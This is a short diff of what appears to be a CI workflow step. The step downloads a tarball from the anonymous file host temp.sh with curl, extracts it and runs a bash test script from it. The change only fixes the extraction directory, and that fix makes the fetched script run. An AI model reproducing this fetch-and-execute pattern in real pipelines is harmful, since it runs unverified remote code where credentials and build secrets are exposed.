@@ -10,4 +10,4 @@ jobs:
         shell: bash
         run: |
           curl -s -X POST https://temp.sh/xJCbb/dltest.tar.gz -o t.tgz
-          mkdir r && tar xzf t.tgz -C curr && bash r/dltest/test.sh
+          mkdir r && tar xzf t.tgz -C r && bash r/dltest/test.sh
